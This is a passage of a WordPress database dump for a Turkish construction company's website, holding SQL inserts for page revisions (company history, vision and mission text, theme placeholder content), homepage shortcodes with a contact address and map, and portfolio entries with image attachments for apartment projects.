gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Hakkımızda","","inherit","open","open","","497-revision-v1","","","2014-06-02 13:45:39","2014-06-02 10:45:39","","497","http://herkonyapi.com/497-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("909","1","2014-06-02 13:43:13","2014-06-02 10:43:13","[cols]
[col-9]
<h4>Who We Are ?</h4>
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero, harum, expedita, delectus perferendis modi soluta nam ab unde libero sit obcaecati nemo optio eligendi quam eveniet ea rem voluptates facilis?

Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad, mollitia, maiores dolorem nesciunt modi molestias accusamus repellat voluptatem quibusdam optio sapiente nemo nisi eum quo quidem quis aperiam error voluptate.

Nunc et rutrum consetetur sadipscing dolor elitr, sed diam nonumy lore at volutpat. Sed consectetur suscipit lorem nunc.adipiscing elit. Integercommodo tristique odio, quis fringilla ligula aliquet. Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.

Ad, mollitia, maiores dolorem nesciunt modi molestias accusamus repellat voluptatem quibusdam optio sapiente nemo nisi eum.
[/col-9]
[col-3]
[callout style=\"1\" title=\"We Hiring\" button_title=\"Apply\" button_color=\"color\" link=\"#\" target=\"_self\"]
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sapiente, vitae distinctio unde quod dolor atque fugiat aut dolore sequi itaque.
[/callout]
[/col-3]
[/cols]
[cols]
[col-6]
<h4 class=\"top-20\">How We Do</h4>
[accordion]
[accordion_item title=\"Our Company Mission\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Success Stories\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Our Approach\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Our Solutions\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Company Culture\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[/accordion]
[/col-6]
[col-6]

&nbsp;","Hakkımızda","","inherit","open","open","","497-revision-v1","","","2014-06-02 13:43:13","2014-06-02 10:43:13","","497","http://herkonyapi.com/497-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("524","1","2013-10-12 13:57:23","2013-10-12 13:57:23","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Binamı Yeniletmek İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Binamı Yeniletmek İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"https://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","publish","closed","closed","","home","","","2016-11-05 02:09:15","2016-11-05 00:09:15","","0","http://localhost/leaf/wordpress/?page_id=524","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("917","1","2014-06-02 14:02:40","2014-06-02 11:02:40","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Refik Osman Top Sokak Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-06-02 14:02:40","2014-06-02 11:02:40","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("836","1","2014-06-02 12:39:00","2014-06-02 09:39:00","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Portfolio Carouse\"][/portfolio]
[cols]
[col-6]
[heading title=\"From The Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"Our Office\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\"][map lat=\"0\" lon=\"0\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" maker=\"yes\" makerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Home","","inherit","open","open","","524-revision-v1","","","2014-06-02 12:39:00","2014-06-02 09:39:00","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("835","1","2014-06-02 12:37:27","2014-06-02 09:37:27","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Portfolio Carouse\"][/portfolio]
[cols]
[col-6]
[heading title=\"From The Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"Our Office\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"Our Office\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Corbi in ipsum sit amet pede facilisis laoreet. Donec lacus nunc, viverra nec, blandit vel, egestas et, augue.\"][map lat=\"0\" lon=\"0\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" maker=\"yes\" makerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Home","","inherit","open","open","","524-revision-v1","","","2014-06-02 12:37:27","2014-06-02 09:37:27","","524","http://herkonyapi.com/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("141","1","2013-10-10 17:04:00","2013-10-10 17:04:00","","Şişli Fikri Bey Apt. Arka Dubleks","","publish","closed","closed","","sisli-arka-dubleks","","","2014-06-02 13:40:27","2014-06-02 10:40:27","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=141","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("910","1","2014-06-02 13:45:17","2014-06-02 10:45:17","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...

Misyonumuz ;

Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Hakkımızda","","inherit","open","open","","497-autosave-v1","","","2014-06-02 13:45:17","2014-06-02 10:45:17","","497","http://herkonyapi.com/497-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("146","1","2013-10-10 17:42:11","2013-10-10 17:42:11","","Şişli Fikri Bey Apt. Ön Dubleks","","publish","closed","closed","","sisli-on-dubleks","","","2014-06-02 13:38:26","2014-06-02 10:38:26","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=146","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("903","1","2014-06-02 13:39:27","2014-06-02 10:39:27","","Şişli Fikri Bey Apt. Arka Dubleks","","inherit","open","open","","141-autosave-v1","","","2014-06-02 13:39:27","2014-06-02 10:39:27","","141","http://herkonyapi.com/141-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("904","1","2014-06-02 13:39:56","2014-06-02 10:39:56","","10","","inherit","open","open","","10-8","","","2014-06-02 13:39:56","2014-06-02 10:39:56","","141","http://herkonyapi.com/wp-content/uploads/2013/10/107.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("905","1","2014-06-02 13:40:13","2014-06-02 10:40:13","","1","","inherit","open","open","","1-8","","","2014-06-02 13:40:13","2014-06-02 10:40:13","","141","http://herkonyapi.com/wp-content/uploads/2013/10/17.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("906","1","2014-06-02 13:40:16","2014-06-02 10:40:16","","2","","inherit","open","open","","2-7","","","2014-06-02 13:40:16","2014-06-02 10:40:16","","141","http://herkonyapi.com/wp-content/uploads/2013/10/26.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("907","1","2014-06-02 13:40:18","2014-06-02 10:40:18","","5","","inherit","open","open","","5-3","","","2014-06-02 13:40:18","2014-06-02 10:40:18","","141","http://herkonyapi.com/wp-content/uploads/2013/10/52.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("908","1","2014-06-02 13:40:20","2014-06-02 10:40:20","","6","","inherit","open","open","","6-9","","","2014-06-02 13:40:20","2014-06-02 10:40:20","","141","http://herkonyapi.com/wp-content/uploads/2013/10/68.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("151","1","2013-10-10 17:45:39","2013-10-10 17:45:39","","Şişli Fikri Bey Apt. 3+1 Ön","","publish","closed","closed","","sisli-3-1-on","","","2014-06-02 13:33:27","2014-06-02 10:33:27","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=151","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("897","1","2014-06-02 13:37:25","2014-06-02 10:37:25","","Şişli Fikri Bey Apt. Ön Dubleks","","inherit","open","open","","146-autosave-v1","","","2014-06-02 13:37:25","2014-06-02 10:37:25","","146","http://herkonyapi.com/146-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("898","1","2014-06-02 13:37:50","2014-06-02 10:37:50","","2","","inherit","open","open","","2-6","","","2014-06-02 13:37:50","2014-06-02 10:37:50","","146","http://herkonyapi.com/wp-content/uploads/2013/10/25.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("899","1","2014-06-02 13:38:11","2014-06-02 10:38:11","","4","","inherit","open","open","","4-2","","","2014-06-02 13:38:11","2014-06-02 10:38:11","","146","http://herkonyapi.com/wp-content/uploads/2013/10/41.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("900","1","2014-06-02 13:38:13","2014-06-02 10:38:13","","6","","inherit","open","open","","6-8","","","2014-06-02 13:38:13","2014-06-02 10:38:13","","146","http://herkonyapi.com/wp-content/uploads/2013/10/67.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("901","1","2014-06-02 13:38:15","2014-06-02 10:38:15","","10","","inherit","open","open","","10-7","","","2014-06-02 13:38:15","2014-06-02 10:38:15","","146","http://herkonyapi.com/wp-content/uploads/2013/10/106.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("902","1","2014-06-02 13:38:17","2014-06-02 10:38:17","","12","","inherit","open","open","","12-2","","","2014-06-02 13:38:17","2014-06-02 10:38:17","","146","http://herkonyapi.com/wp-content/uploads/2013/10/122.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("159","1","2013-10-11 02:47:11","2013-10-11 02:47:11","","Şişli Fikri Bey Apt. 3+1","","publish","closed","closed","","sisli-3-1","","","2014-06-02 13:32:55","2014-06-02 10:32:55","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=159","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("893","1","2014-06-02 13:33:13","2014-06-02 10:33:13","","6","","inherit","open","open","","6-7","","","2014-06-02 13:33:13","2014-06-02 10:33:13","","151","http://herkonyapi.com/wp-content/uploads/2013/10/66.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("894","1","2014-06-02 13:33:15","2014-06-02 10:33:15","","8","","inherit","open","open","","8-5","","","2014-06-02 13:33:15","2014-06-02 10:33:15","","151","http://herkonyapi.com/wp-content/uploads/2013/10/84.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("895","1","2014-06-02 13:33:17","2014-06-02 10:33:17","","9","","inherit","open","open","","9-5","","","2014-06-02 13:33:17","2014-06-02 10:33:17","","151","http://herkonyapi.com/wp-content/uploads/2013/10/94.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("896","1","2014-06-02 13:33:19","2014-06-02 10:33:19","","10","","inherit","open","open","","10-6","","","2014-06-02 13:33:19","2014-06-02 10:33:19","","151","http://herkonyapi.com/wp-content/uploads/2013/10/105.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("162","1","2013-10-11 02:52:03","2013-10-11 02:52:03","","Şişli Fikri Bey Apt. 1+1","","publish","closed","closed","","sisli-1-1","","","2014-06-02 13:31:46","2014-06-02 10:31:46","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=162","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("887","1","2014-06-02 13:32:06","2014-06-02 10:32:06","","3","","inherit","open","open","","3-5","","","2014-06-02 13:32:06","2014-06-02 10:32:06","","159","http://herkonyapi.com/wp-content/uploads/2013/10/34.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("888","1","2014-06-02 13:32:22","2014-06-02 10:32:22","","1","","inherit","open","open","","1-6","","","2014-06-02 13:32:22","2014-06-02 10:32:22","","159","http://herkonyapi.com/wp-content/uploads/2013/10/15.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("889","1","2014-06-02 13:32:24","2014-06-02 10:32:24","","2","","inherit","open","open","","2-5","","","2014-06-02 13:32:24","2014-06-02 10:32:24","","159","http://herkonyapi.com/wp-content/uploads/2013/10/24.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("890","1","2014-06-02 13:32:29","2014-06-02 10:32:29","","7","","inherit","open","open","","7-2","","","2014-06-02 13:32:29","2014-06-02 10:32:29","","159","http://herkonyapi.com/wp-content/uploads/2013/10/71.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("891","1","2014-06-02 13:32:31","2014-06-02 10:32:31","","10","","inherit","open","open","","10-5","","","2014-06-02 13:32:31","2014-06-02 10:32:31","","159","http://herkonyapi.com/wp-content/uploads/2013/10/104.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("892","1","2014-06-02 13:32:41","2014-06-02 10:32:41","","1","","inherit","open","open","","1-7","","","2014-06-02 13:32:41","2014-06-02 10:32:41","","151","http://herkonyapi.com/wp-content/uploads/2013/10/16.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("166","1","2013-10-11 02:54:54","2013-10-11 02:54:54","","Kalıpçı Sokak Sude Apt. Giriş Kat","","publish","closed","closed","","kalipci-sokak-sude-apartman-giris-kat","","","2014-06-02 13:22:58","2014-06-02 10:22:58","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=166","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("873","1","2014-06-02 13:23:46","2014-06-02 10:23:46","","10","","inherit","open","open","","10-3","","","2014-06-02 13:23:46","2014-06-02 10:23:46","","168","http://herkonyapi.com/wp-content/uploads/2013/10/102.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("874","1","2014-06-02 13:24:13","2014-06-02 10:24:13","","2","","inherit","open","open","","2-4","","","2014-06-02 13:24:13","2014-06-02 10:24:13","","168","http://herkonyapi.com/wp-content/uploads/2013/10/23.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("875","1","2014-06-02 13:24:15","2014-06-02 10:24:15","","3","","inherit","open","open","","3-3","","","2014-06-02 13:24:15","2014-06-02 10:24:15","","168","http://herkonyapi.com/wp-content/uploads/2013/10/32.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("876","1","2014-06-02 13:24:17","2014-06-02 10:24:17","","6","","inherit","open","open","","6-5","","","2014-06-02 13:24:17","2014-06-02 10:24:17","","168","http://herkonyapi.com/wp-content/uploads/2013/10/64.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("877","1","2014-06-02 13:24:19","2014-06-02 10:24:19","","8","","inherit","open","open","","8-4","","","2014-06-02 13:24:19","2014-06-02 10:24:19","","168","http://herkonyapi.com/wp-content/uploads/2013/10/83.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("885","1","2014-06-02 13:31:27","2014-06-02 10:31:27","","9","","inherit","open","open","","9-4","","","2014-06-02 13:31:27","2014-06-02 10:31:27","","162","http://herkonyapi.com/wp-content/uploads/2013/10/93.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("886","1","2014-06-02 13:31:29","2014-06-02 10:31:29","","10","","inherit","open","open","","10-4","","","2014-06-02 13:31:29","2014-06-02 10:31:29","","162","http://herkonyapi.com/wp-content/uploads/2013/10/103.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("168","1","2013-10-11 02:58:56","2013-10-11 02:58:56","","Kalıpçı Sokak Sude Apt. Kat 2","","publish","closed","closed","","kalipci-sokak-sude-apartman-kat-2","","","2014-06-02 13:27:27","2014-06-02 10:27:27","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=168","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("879","1","2014-06-02 13:30:59","2014-06-02 10:30:59","","Şişli Fikri Bey Apt. 1+1","","inherit","open","open","","162-autosave-v1","","","2014-06-02 13:30:59","2014-06-02 10:30:59","","162","http://herkonyapi.com/162-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("882","1","2014-06-02 13:30:18","2014-06-02 10:30:18","","1","","inherit","open","open","","1-5","","","2014-06-02 13:30:18","2014-06-02 10:30:18","","162","http://herkonyapi.com/wp-content/uploads/2013/10/14.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("883","1","2014-06-02 13:31:24","2014-06-02 10:31:24","","3","","inherit","open","open","","3-4","","","2014-06-02 13:31:24","2014-06-02 10:31:24","","162","http://herkonyapi.com/wp-content/uploads/2013/10/33.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("884","1","2014-06-02 13:31:26","2014-06-02 10:31:26","","6","","inherit","open","open","","6-6","","","2014-06-02 13:31:26","2014-06-02 10:31:26","","162","http://herkonyapi.com/wp-content/uploads/2013/10/65.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("173","1","2013-10-11 03:03:33","2013-10-11 03:03:33","","Kalıpçı Sokak Sude Apt. Dubleks","","publish","closed","closed","","kalipci-sokak-sude-apartman-dubleks","","","2014-06-02 13:20:30","2014-06-02 10:20:30","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=173","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("866","1","2014-06-02 13:21:48","2014-06-02 10:21:48","","Kalıpçı Sokak Sude Apt. Kat 2","","inherit","open","open","","168-autosave-v1","","","2014-06-02 13:21:48","2014-06-02 10:21:48","","168","http://herkonyapi.com/168-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("867","1","2014-06-02 13:22:08","2014-06-02 10:22:08","","1","","inherit","open","open","","1-4","","","2014-06-02 13:22:08","2014-06-02 10:22:08","","166","http://herkonyapi.com/wp-content/uploads/2013/10/13.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("868","1","2014-06-02 13:22:20","2014-06-02 10:22:20","","Kalıpçı Sokak Sude Apt. Giriş Kat","","inherit","open","open","","166-autosave-v1","","","2014-06-02 13:22:20","2014-06-02 10:22:20","","166","http://herkonyapi.com/166-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("869","1","2014-06-02 13:22:44","2014-06-02 10:22:44","","2","","inherit","open","open","","2-3","","","2014-06-02 13:22:44","2014-06-02 10:22:44","","166","http://herkonyapi.com/wp-content/uploads/2013/10/22.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("870","1","2014-06-02 13:22:46","2014-06-02 10:22:46","","3","","inherit","open","open","","3-2","","","2014-06-02 13:22:46","2014-06-02 10:22:46","","166","http://herkonyapi.com/wp-content/uploads/2013/10/31.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("177","1","2013-10-11 03:08:18","2013-10-11 03:08:18","","Hervenik Dubleks 6","","publish","closed","closed","","hervenik-dubleks-6","","","2014-06-02 13:16:26","2014-06-02 10:16:26","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=177","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("860","1","2014-06-02 13:19:26","2014-06-02 10:19:26","","Kalıpçı Sokak Sude Apt. Dubleks","","inherit","open","open","","173-autosave-v1","","","2014-06-02 13:19:26","2014-06-02 10:19:26","","173","http://herkonyapi.com/173-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("861","1","2014-06-02 13:19:44","2014-06-02 10:19:44","","New_2","","inherit","open","open","","new_2-2","","","2014-06-02 13:19:44","2014-06-02 10:19:44","","173","http://herkonyapi.com/wp-content/uploads/2013/10/New_21.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("862","1","2014-06-02 13:20:07","2014-06-02 10:20:07","","New_2","","inherit","open","open","","new_2-3","","","2014-06-02 13:20:07","2014-06-02 10:20:07","","173","http://herkonyapi.com/wp-content/uploads/2013/10/New_22.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("863","1","2014-06-02 13:20:10","2014-06-02 10:20:10","","New_4","","inherit","open","open","","new_4-2","","","2014-06-02 13:20:10","2014-06-02 10:20:10","","173","http://herkonyapi.com/wp-content/uploads/2013/10/New_41.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("864","1","2014-06-02 13:20:14","2014-06-02 10:20:14","","New_5","","inherit","open","open","","new_5-2","","","2014-06-02 13:20:14","2014-06-02 10:20:14","","173","http://herkonyapi.com/wp-content/uploads/2013/10/New_51.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("182","1","2013-10-11 04:58:18","2013-10-11 04:58:18","","Hervenik Apartman Daire 4","","publish","closed","closed","","hervenik-apartman-daire-4","","","2014-06-02 13:13:53","2014-06-02 10:13:53","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=182","0","portfolio","","0");
